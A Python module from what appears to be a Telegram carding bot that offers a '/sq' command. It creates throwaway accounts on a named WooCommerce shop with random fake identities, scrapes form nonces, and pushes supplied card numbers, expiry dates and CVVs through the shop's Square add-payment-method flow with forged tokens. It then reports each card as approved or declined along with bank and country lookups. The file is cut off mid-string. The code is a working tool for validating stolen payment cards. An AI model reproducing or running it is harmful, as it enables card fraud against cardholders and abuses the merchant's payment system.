# BOT/gates/auth/square/sqauth.py
import json
import asyncio
import re
import time
import httpx
import random
import string
from datetime import datetime, timedelta
from pyrogram import Client, filters
from pyrogram.types import Message
import html
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users

class SquareAuthChecker:
    def __init__(self):
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
        self.base_url = "https://cupartistryblanks.com"
        self.bin_cache = {}
        
        # BIN services configuration from stauth2.py
        self.bin_services = [
            {
                'url': 'https://lookup.binlist.net/{bin}',
                'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
                'name': 'binlist.net',
                'parser': self.parse_binlist_net
            },
            {
                'url': 'https://bins.antipublic.cc/bins/{bin}',
                'headers': {'User-Agent': self.user_agent},
                'name': 'antipublic.cc',
                'parser': self.parse_antipublic
            }
        ]

    def get_headers(self, content_type=None):
        """Get headers - FIXED to avoid compression issues"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'User-Agent': self.user_agent,
            'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        if content_type:
            headers['Content-Type'] = content_type
            
        return headers

    def get_country_emoji(self, country_code):
        """Get country flag emoji - ADDED from stauth2.py"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
            'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
            'EG': '🇪🇬', 'MA': '🇲🇦', 'DZ': '🇩🇿', 'TN': '🇹🇳', 'LY': '🇱🇾',
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')

    def parse_binlist_net(self, data):
        """Parser for binlist.net - ADDED from stauth2.py"""
        scheme = data.get('scheme', 'N/A').upper()
        if scheme == 'N/A':
            scheme = data.get('brand', 'N/A').upper()

        card_type = data.get('type', 'N/A').upper()
        brand = data.get('brand', 'N/A')
        bank_name = data.get('bank', {}).get('name', 'N/A').upper()
        country_name = data.get('country', {}).get('name', 'N/A')
        country_code = data.get('country', {}).get('alpha2', 'N/A')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        brand_display = brand.upper() if brand != 'N/A' else 'N/A'

        flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': scheme,
            'type': card_type,
            'brand': brand_display,
            'bank': bank_name,
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    def parse_antipublic(self, data):
        """Parser for antipublic.cc - ADDED from stauth2.py"""
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except json.JSONDecodeError:
                return {
                    'scheme': 'N/A',
                    'type': 'N/A',
                    'brand': 'N/A',
                    'bank': 'N/A',
                    'country': 'N/A',
                    'country_code': 'N/A',
                    'emoji': '🏳️'
                }

        country_code = data.get('country', 'N/A')
        country_name = data.get('country_name', country_code)
        flag_emoji = data.get('country_flag', '🏳️')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        if flag_emoji == '🏳️' or flag_emoji == 'N/A':
            if country_code != 'N/A' and len(country_code) == 2:
                flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': data.get('brand', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A').upper(),
            'bank': data.get('bank', 'N/A').upper(),
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    async def get_bin_info(self, cc):
        """Get BIN information - FIXED to use both services like stauth2.py"""
        if len(cc) < 6:
            return {'scheme': 'N/A', 'bank': 'N/A', 'country': 'N/A', 'emoji': '🏳️', 'type': 'N/A', 'brand': 'N/A'}

        bin_number = cc[:6]
        
        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        # Try antipublic.cc first (has better flag support)
        try:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            headers = {'User-Agent': self.user_agent}
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(url, headers=headers)
                if response.status_code == 200:
                    data = response.json()
                    if "detail" not in data or "not found" not in str(data.get("detail", "")).lower():
                        result = self.parse_antipublic(data)
                        self.bin_cache[bin_number] = result
                        return result
        except Exception as e:
            pass

        # Fallback to binlist.net
        try:
            url = f"https://lookup.binlist.net/{bin_number}"
            headers = {'Accept-Version': '3', 'User-Agent': self.user_agent}
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(url, headers=headers)
                if response.status_code == 200:
                    data = response.json()
                    result = self.parse_binlist_net(data)
                    
                    # Fix flag if missing
                    if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
                        result['emoji'] = self.get_country_emoji(result['country_code'])
                    
                    self.bin_cache[bin_number] = result
                    return result
        except Exception as e:
            pass

        default_info = {'scheme': 'N/A', 'bank': 'N/A', 'country': 'N/A', 'emoji': '🏳️', 'type': 'N/A', 'brand': 'N/A'}
        self.bin_cache[bin_number] = default_info
        return default_info

    def generate_random_email(self):
        """Generate random email for registration"""
        domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
        first_names = ["john", "jane", "mike", "sarah", "david", "lisa", "robert", "emma", "william", "sophia"]
        last_names = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez"]

        first = random.choice(first_names)
        last = random.choice(last_names)
        number = random.randint(100, 999)
        domain = random.choice(domains)

        return f"{first}.{last}{number}@{domain}"

    def generate_random_username(self):
        """Generate random username"""
        adjectives = ["cool", "happy", "smart", "fast", "brave", "clever", "quiet", "bold", "calm", "proud"]
        nouns = ["tiger", "eagle", "wolf", "lion", "bear", "hawk", "fox", "owl", "shark", "panther"]
        number = random.randint(10, 99)

        return f"{random.choice(adjectives)}{random.choice(nouns)}{number}"

    def extract_nonce_from_html(self, html_content, nonce_type="register"):
        """Extract nonce from HTML - ROBUST VERSION with encoding fix"""
        if not html_content:
            print(f"❌ No HTML content for {nonce_type} nonce extraction")
            return None
            
        # Check if content looks like binary/garbage
        printable_chars = sum(1 for c in html_content if c.isprintable() or c.isspace())
        if len(html_content) > 0 and printable_chars / len(html_content) < 0.8:
            print(f"⚠️ HTML appears to be binary/encoded content ({printable_chars}/{len(html_content)} printable)")
            # Try to decode as various encodings
            for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
                try:
                    if isinstance(html_content, bytes):
                        decoded = html_content.decode(encoding, errors='ignore')
                    else:
                        decoded = html_content.encode('latin-1').decode(encoding, errors='ignore')
                    printable = sum(1 for c in decoded if c.isprintable() or c.isspace())
                    if printable / len(decoded) > 0.8:
                        print(f"✅ Successfully decoded HTML using {encoding}")
                        html_content = decoded
                        break
                except:
                    continue
        
        # Ensure we're working with string
        if isinstance(html_content, bytes):
            try:
                html_content = html_content.decode('utf-8', errors='ignore')
            except:
                html_content = html_content.decode('latin-1', errors='ignore')
        
        print(f"🔍 Extracting {nonce_type} nonce from HTML (length: {len(html_content)})...")
        
        # Look for specific patterns based on type
        if nonce_type == "register":
            patterns = [
                r'name=[\'"]woocommerce-register-nonce[\'"]\s*value=[\'"]([a-fA-F0-9]{8,20})[\'"]',
                r'value=[\'"]([a-fA-F0-9]{8,20})[\'"]\s*name=[\'"]woocommerce-register-nonce[\'"]',
                r'id=[\'"]woocommerce-register-nonce[\'"]\s*[^>]*value=[\'"]([a-fA-F0-9]{8,20})[\'"]',
                r'woocommerce-register-nonce.*?value=[\'"]([a-fA-F0-9]{8,20})[\'"]',
                r'name="woocommerce-register-nonce"\s+value="([a-fA-F0-9]{8,20})"',
                r'name=\'woocommerce-register-nonce\'\s+value=\'([a-fA-F0-9]{8,20})\'',
                r'"woocommerce-register-nonce":\s*"([a-fA-F0-9]{8,20})"',
            ]
        elif nonce_type == "add_payment":
            patterns = [
                r'name=[\'"]woocommerce-add-payment-method-nonce[\'"]\s*value=[\'"]([a-fA-F0-9]{8,20})[\'"]',
                r'value=[\'"]([a-fA-F0-9]{8,20})[\'"]\s*name=[\'"]woocommerce-add-payment-method-nonce[\'"]',
                r'woocommerce-add-payment-method-nonce.*?value=[\'"]([a-fA-F0-9]{8,20})[\'"]',
                r'"woocommerce-add-payment-method-nonce":\s*"([a-fA-F0-9]{8,20})"',
            ]
        else:
            patterns = [
                r'name=[\'"][^\'"]*nonce[^\'"]*[\'"]\s*value=[\'"]([a-fA-F0-9]{8,20})[\'"]',
                r'value=[\'"]([a-fA-F0-9]{8,20})[\'"].*?nonce',
            ]
        
        for i, pattern in enumerate(patterns):
            try:
                match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
                if match:
                    nonce = match.group(1)
                    print(f"✅ Found {nonce_type} nonce with pattern {i+1}: {nonce}")
                    return nonce
            except Exception as e:
                continue
        
        # If no specific pattern matched, try to find any nonce-like value
        print(f"⚠️ No specific {nonce_type} nonce pattern matched, searching for any nonce...")
        
        # Look for common nonce patterns
        general_patterns = [
            r'name=[\'"][^\'"]*(?:register|payment|add)[^\'"]*[\'"]\s*value=[\'"]([a-fA-F0-9]{8,20})[\'"]',
            r'<input[^>]*type=[\'"]hidden[\'"][^>]*value=[\'"]([a-fA-F0-9]{10,20})[\'"][^>]*>',
            r'[\'"]([a-fA-F0-9]{10,20})[\'"].*?(?:nonce|token|verify)',
        ]
        
        for pattern in general_patterns:
            try:
                matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    if 8 <= len(match) <= 20:
                        print(f"✅ Found potential {nonce_type} nonce via general search: {match}")
                        return match
            except:
                continue
        
        # Debug: print snippet around "nonce" keyword
        nonce_idx = html_content.lower().find('nonce')
        if nonce_idx != -1:
            print(f"🔍 HTML snippet around 'nonce':")
            start = max(0, nonce_idx - 100)
            end = min(len(html_content), nonce_idx + 200)
            snippet = html_content[start:end]
            # Clean snippet for display
            snippet = re.sub(r'[^\x20-\x7E\s]', '?', snippet)
            print(snippet)
        else:
            print("🔍 No 'nonce' keyword found in HTML")
            # Print first 500 chars of cleaned HTML
            cleaned = re.sub(r'[^\x20-\x7E\s]', '?', html_content[:500])
            print(f"🔍 First 500 chars of cleaned HTML:\n{cleaned}")
        
        print(f"❌ {nonce_type} nonce not found")
        return None

    def get_cookies_dict(self, client):
        """Safely extract cookies from httpx client - FIXED for duplicate cookie names"""
        cookies_dict = {}
        try:
            # Handle both Cookies object and dict-like access
            if hasattr(client, 'cookies'):
                cookie_jar = client.cookies
                # Iterate through all cookies and get the last value for each name
                # (httpx.Cookies is iterable yielding (name, value) tuples)
                for name, value in cookie_jar.items():
                    cookies_dict[name] = value
        except Exception as e:
            print(f"⚠️ Error extracting cookies: {e}")
            # Fallback: try to get from response headers if available
            pass
        return cookies_dict

    async def register_new_user(self, client):
        """Register new user with random credentials - FIXED VERSION"""
        try:
            print("=" * 50)
            print("🔄 Step 1: Getting homepage to establish session...")
            
            # First request to get cookies/session
            home_headers = self.get_headers()
            home_response = await client.get(f"{self.base_url}/", headers=home_headers)
            print(f"📊 Homepage status: {home_response.status_code}")
            home_cookies = self.get_cookies_dict(client)
            print(f"📊 Homepage cookies: {home_cookies}")
            
            # Reduced delay for speed
            await asyncio.sleep(random.uniform(1, 2))

            print("\n🔄 Step 2: Getting registration page...")
            headers = self.get_headers()
            headers['Referer'] = f"{self.base_url}/"
            
            # Add cache-busting parameter
            cache_buster = random.randint(1000000, 9999999)
            reg_url = f"{self.base_url}/my-account/?v={cache_buster}"
            
            response = await client.get(reg_url, headers=headers)
            print(f"📊 Registration page status: {response.status_code}")
            print(f"📊 Response length: {len(response.text)} chars")
            print(f"📊 Content-Type: {response.headers.get('content-type', 'unknown')}")
            print(f"📊 Final URL: {response.url}")

            if response.status_code != 200:
                return False, f"Failed to load registration page: {response.status_code}"

            response_text = response.text
            
            # Check if response looks valid
            if len(response_text) < 1000:
                return False, f"Response too short ({len(response_text)} chars), possible block"

            # Debug: Show page title
            title_match = re.search(r'<title[^>]*>(.*?)</title>', response_text, re.IGNORECASE | re.DOTALL)
            if title_match:
                print(f"📄 Page title: {title_match.group(1).strip()}")

            # Extract registration nonce
            nonce = self.extract_nonce_from_html(response_text, "register")

            if not nonce:
                return False, "Registration nonce not found in page"

            print(f"✅ Using nonce: {nonce}")

            # Generate random user details
            username = self.generate_random_username()
            email = self.generate_random_email()
            password = f"P@ss{random.randint(1000, 9999)}!"

            print(f"\n📝 Registering as:")
            print(f"   Username: {username}")
            print(f"   Email: {email}")

            # Try to extract wp_http_referer
            wp_referer_match = re.search(r'name=[\'"]_wp_http_referer[\'"][^>]*value=[\'"]([^\'"]*)[\'"]', response_text, re.IGNORECASE)
            wp_http_referer = wp_referer_match.group(1) if wp_referer_match else "/my-account/"
            print(f"📌 WP HTTP Referer: {wp_http_referer}")

            # Step 3: Submit registration
            print("\n🔄 Step 3: Submitting registration...")
            
            current_time = datetime.now()
            session_start = (current_time - timedelta(minutes=random.randint(1, 5))).strftime('%Y-%m-%d %H:%M:%S')
            
            reg_data = {
                'username': username,
                'email': email,
                'password': password,
                'mailchimp_woocommerce_newsletter': '1',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': f'{self.base_url}/my-account/',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f'{self.base_url}/',
                'wc_order_attribution_session_start_time': session_start,
                'wc_order_attribution_session_pages': str(random.randint(2, 5)),
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.user_agent,
                'woocommerce-register-nonce': nonce,
                '_wp_http_referer': wp_http_referer,
                'register': 'Register'
            }

            print(f"📤 Using nonce: {nonce}")

            reg_headers = self.get_headers()
            reg_headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url,
                'Referer': f'{self.base_url}/my-account/',
            })

            reg_response = await client.post(
                f"{self.base_url}/my-account/", 
                data=reg_data, 
                headers=reg_headers, 
                follow_redirects=True
            )

            print(f"\n📊 Registration POST status: {reg_response.status_code}")
            print(f"📊 Final URL: {reg_response.url}")

            # Check if registration was successful - FIXED cookie handling
            response_cookies = self.get_cookies_dict(client)
            response_text_lower = reg_response.text.lower()

            # Check for logged in cookie
            success_found = False
            for cookie_name in response_cookies:
                if 'wordpress_logged_in' in cookie_name.lower():
                    print(f"✅ Found logged in cookie: {cookie_name}")
                    success_found = True
                    break

            if not success_found:
                # Check for success indicators in response
                success_indicators = [
                    'registration complete', 'my account dashboard', 'log out', 
                    'logout', 'account details', 'dashboard', 'edit account'
                ]
                for indicator in success_indicators:
                    if indicator in response_text_lower:
                        print(f"✅ Success indicator found: {indicator}")
                        success_found = True
                        break

            if success_found:
                return True, "Registration successful"

            # Check for errors
            error_patterns = [
                r'class=[\'"][^\'"]*woocommerce-error[^\'"]*[\'"][^>]*>(.*?)</div>',
                r'class=[\'"][^\'"]*error[^\'"]*[\'"][^>]*>(.*?)</div>',
            ]
            
            for pattern in error_patterns:
                try:
                    matches = re.findall(pattern, reg_response.text, re.DOTALL | re.IGNORECASE)
                    for match in matches:
                        error_text = re.sub(r'<[^>]*>', '', match).strip()
                        if error_text and len(error_text) > 3:
                            return False, f"Error: {error_text[:100]}"
                except:
                    continue

            # Check for nonce error
            if 'nonce' in response_text_lower and ('verify' in response_text_lower or 'invalid' in response_text_lower):
                return False, "Nonce verification failed"

            print("❌ Registration failed - no success indicators")
            return False, "Registration failed"

        except Exception as e:
            print(f"❌ Registration error: {str(e)}")
            import traceback
            traceback.print_exc()
            return False, f"Registration error: {str(e)}"

    async def get_payment_methods_page(self, client):
        """Navigate to payment methods page"""
        try:
            print("\n🔄 Step 4: Navigating to payment methods...")
            headers = self.get_headers()
            headers['Referer'] = f"{self.base_url}/my-account/"

            response = await client.get(f"{self.base_url}/my-account/payment-methods/", headers=headers)

            if response.status_code == 200:
                print("✅ Payment methods page loaded")
                return True, response.text
            else:
                print(f"❌ Failed to load payment methods: {response.status_code}")
                return False, f"Failed: {response.status_code}"

        except Exception as e:
            print(f"❌ Payment methods error: {str(e)}")
            return False, f"Error: {str(e)}"

    async def get_add_payment_page(self, client):
        """Navigate to add payment method page"""
        try:
            print("\n🔄 Step 5: Navigating to add payment method...")
            headers = self.get_headers()
            headers['Referer'] = f"{self.base_url}/my-account/payment-methods/"

            response = await client.get(f"{self.base_url}/my-account/add-payment-method/", headers=headers)

            if response.status_code == 200:
                print("✅ Add payment page loaded")
                
                nonce = self.extract_nonce_from_html(response.text, "add_payment")
                
                if nonce:
                    print(f"✅ Using add payment nonce: {nonce}")
                    return True, response.text, nonce
                else:
                    return False, "Nonce not found", None
            else:
                print(f"❌ Failed to load add payment page: {response.status_code}")
                return False, f"Failed: {response.status_code}", None

        except Exception as e:
            print(f"❌ Add payment page error: {str(e)}")
            return False, f"Error: {str(e)}", None

    def get_card_type(self, cc):
        """Determine card type based on BIN"""
        if cc.startswith('4'):
            return 'VISA'
        elif cc.startswith(('51', '52', '53', '54', '55')):
            return 'MASTERCARD'
        elif cc.startswith(('34', '37')):
            return 'AMEX'
        elif cc.startswith(('300', '301', '302', '303', '304', '305', '36', '38')):
            return 'DINERS'
        elif cc.startswith(('6011', '65', '644', '645', '646', '647', '648', '649')):
            return 'DISCOVER'
        elif cc.startswith(('3528', '3529', '353', '354', '355', '356', '357', '358')):
            return 'JCB'
        else:
            return 'VISA'

    def extract_error_code(self, error_message):
        """Extract error code like INVALID_CARD_DATA from full error message"""
        if not error_message:
            return "Unknown"
        
        # Pattern to match error codes like INVALID_CARD_DATA, CARD_DECLINED, etc.
        # Looks for uppercase words with underscores
        patterns = [
            r'Status code ([A-Z_]+):',
            r'([A-Z][A-Z_]+[A-Z])',  # Match UPPER_CASE_UNDERSCORE patterns
        ]
        
        for pattern in patterns:
            match = re.search(pattern, error_message)
            if match:
                return match.group(1)
        
        # If no pattern matched, return original message but cleaned
        # Remove common prefixes
        cleaned = re.sub(r'^(Declined|Error|Failed):\s*', '', error_message, flags=re.IGNORECASE)
        return cleaned.strip()[:50]

    async def process_card_with_square(self, client, cc, mes, ano, cvv, page_text, add_nonce):
        """Process card through Square payment gateway"""
        try:
            print("\n🔄 Step 6: Processing card with Square...")

            card_type = self.get_card_type(cc)
            last_four = cc[-4:]

            print(f"💳 Card: {card_type} | {cc[:6]}...{last_four} | {mes}/{ano}")

            # Generate Square nonce
            square_nonce = f"cnon:{''.join(random.choices(string.ascii_uppercase + string.digits, k=32))}"
            verification_token = f"verf:{''.join(random.choices(string.ascii_uppercase + string.digits, k=32))}"
            postal_code = f"{random.randint(10000, 99999)}"

            payment_data = {
                'payment_method': 'square_credit_card',
                'wc-square-credit-card-card-type': card_type,
                'wc-square-credit-card-last-four': last_four,
                'wc-square-credit-card-exp-month': mes,
                'wc-square-credit-card-exp-year': ano,
                'wc-square-credit-card-payment-nonce': square_nonce,
                'wc-square-credit-card-payment-postcode': postal_code,
                'wc-square-credit-card-buyer-verification-token': verification_token,
                'wc-square-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': add_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1'
            }

            headers = self.get_headers()
            headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url,
                'Referer': f'{self.base_url}/my-account/add-payment-method/',
            })

            response = await client.post(
                f"{self.base_url}/my-account/add-payment-method/",
                data=payment_data,
                headers=headers,
                follow_redirects=True
            )

            print(f"📊 Response: {response.status_code} | URL: {response.url}")

            response_text = response.text
            response_lower = response_text.lower()

            # Check for success
            success_indicators = [
                'payment method successfully added', 'payment method added',
                'successfully added', 'payment method saved'
            ]
            
            for indicator in success_indicators:
                if indicator in response_lower:
                    return True, "Payment method added"

            # Check for redirect to payment methods
            if 'payment-methods' in str(response.url).lower():
                return True, "Added (redirect)"

            # Check for errors
            error_indicators = ['declined', 'invalid', 'error', 'failed', 'not accepted']
            error_msg = "Unknown"
            
            for indicator in error_indicators:
                if indicator in response_lower:
                    # Try to extract error message
                    wc_error_match = re.search(r'class=[\'"][^\'"]*error[^\'"]*[\'"][^>]*>(.*?)</div>', response_text, re.DOTALL | re.IGNORECASE)
                    if wc_error_match:
                        error_msg = re.sub(r'<[^>]*>', '', wc_error_match.group(1)).strip()[:150]
                        # Extract only the error code for display
                        error_code = self.extract_error_code(error_msg)
                        print(f"🔍 Full error: {error_msg}")
                        print(f"🔍 Extracted code: {error_code}")
                        return False, error_code
                    return False, "DECLINED"

            return False, "Unknown response"

        except Exception as e:
            print(f"❌ Square error: {str(e)}")
            return False, f"Error: {str(e)[:50]}"

    async def check_card(self, card_details, username, user_data):
        """Main function to check card via Square"""
        start_time = time.time()
        cc, mes, ano, cvv = "", "", "", ""

        try:
            parts = card_details.split('|')
            if len(parts) < 4:
                return self.format_response("", "", "", "", "ERROR", "Invalid format", username, 0, user_data)

            cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()

            # Validate
            if not cc.isdigit() or len(cc) < 15:
                return self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card", username, 0, user_data)
            if not mes.isdigit() or not (1 <= int(mes) <= 12):
                return self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, 0, user_data)
            if not ano.isdigit():
                return self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, 0, user_data)
            if len(ano) == 2:
                ano = '20' + ano
            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, 0, user_data)

            bin_info = await self.get_bin_info(cc)

            # Create client with proper settings
            async with httpx.AsyncClient(
                timeout=60.0,
                follow_redirects=True,
                http2=False,  # Disable HTTP/2 to avoid issues
                limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
            ) as client:

                # Step 1: Register
                registered, reg_msg = await self.register_new_user(client)
                if not registered:
                    elapsed = time.time() - start_time
                    return self.format_response(cc, mes, ano, cvv, "ERROR", f"Reg: {reg_msg}", username, elapsed, user_data, bin_info)

                # Reduced delay for speed
                await asyncio.sleep(random.uniform(0.5, 1.5))

                # Step 2: Payment methods
                payment_loaded, payment_msg = await self.get_payment_methods_page(client)
                if not payment_loaded:
                    elapsed = time.time() - start_time
                    return self.format_response(cc, mes, ano, cvv, "ERROR", f"Payment: {payment_msg}", username, elapsed, user_data, bin_info)

                # Reduced delay for speed
                await asyncio.sleep(random.uniform(0.5, 1.5))

                # Step 3: Add payment page
                add_loaded, add_page, add_nonce = await self.get_add_payment_page(client)
                if not add_loaded:
                    elapsed = time.time() - start_time
                    return self.format_response(cc, mes, ano, cvv, "ERROR", f"Add: {add_nonce}", username, elapsed, user_data, bin_info)

                # Reduced delay for speed
                await asyncio.sleep(random.uniform(0.5, 1.5))

                # Step 4: Process card
                added, result_msg = await self.process_card_with_square(client, cc, mes, ano, cvv, add_page, add_nonce)

                elapsed = time.time() - start_time

                if added:
                    return self.format_response(cc, mes, ano, cvv, "APPROVED", result_msg, username, elapsed, user_data, bin_info)
                else:
                    return self.format_response(cc, mes, ano, cvv, "DECLINED", result_msg, username, elapsed, user_data, bin_info)

        except Exception as e:
            elapsed = time.time() - start_time
            print(f"❌ Main error: {str(e)}")
            import traceback
            traceback.print_exc()
            return self.format_response(cc, mes, ano, cvv, "ERROR", f"System: {str(e)[:50]}", username, elapsed, user_data)

    def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        """Format response message"""
        if bin_info is None:
            bin_info = {'scheme': 'N/A', 'bank': 'N/A', 'country': 'N/A', 'emoji': '🏳️', 'type': 'N/A', 'brand': 'N/A'}

        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🎭")

        if "APPROVED" in status:
            status_emoji, status_text = "✅", "APPROVED"
        elif "DECLINED" in status:
            status_emoji, status_text = "❌", "DECLINED"
        else:
            status_emoji, status_text = "⚠️", "ERROR"

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"

        response = f"""<b>「$cmd → /sq」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Square Auth
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bin_info['bank']}</code> 🏦
<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""

        return response

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        return f"""<b>「$cmd → /sq」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Square Auth
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {user_plan}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Registering & checking card... Please wait.</b>"""

@Client.on_message(filters.command(["sq", ".sq", "!sq"]))
@auth_and_free_restricted
async def handle_square_auth(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        from BOT.helper.Admins import is_command_disabled, get_command_offline_message

        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.!')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        def is_user_banned(user_id):
            try:
                with open("DATA/banned_users.txt", "r") as f:
                    return str(user_id) in f.read().splitlines()
            except:
                return False

        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        def check_cooldown(user_id, cmd_type):
            try:
                with open("DATA/cooldowns.json", "r") as f:
                    cooldowns = json.load(f)
            except:
                cooldowns = {}

            user_key = f"{user_id}_{cmd_type}"
            current_time = time.time()

            if user_key in cooldowns:
                last_time = cooldowns[user_key]
                # FIXED: Handle None antispam value
                antispam = user_plan.get("antispam")
                if antispam is None:
                    antispam = 15
                else:
                    antispam = float(antispam)
                    
                if current_time - last_time < antispam:
                    return False, antispam - (current_time - last_time)

            cooldowns[user_key] = current_time
            try:
                with open("DATA/cooldowns.json", "w") as f:
                    json.dump(cooldowns, f, indent=4)
            except:
                pass

            return True, 0

        can_use, wait_time = check_cooldown(user_id, "sq")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f}s before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ─[SQUARE AUTH]─</pre>
━━━━━━━━━━━━━
⟐ <b>Command</b>: <code>/sq cc|mm|yy|cvv</code>
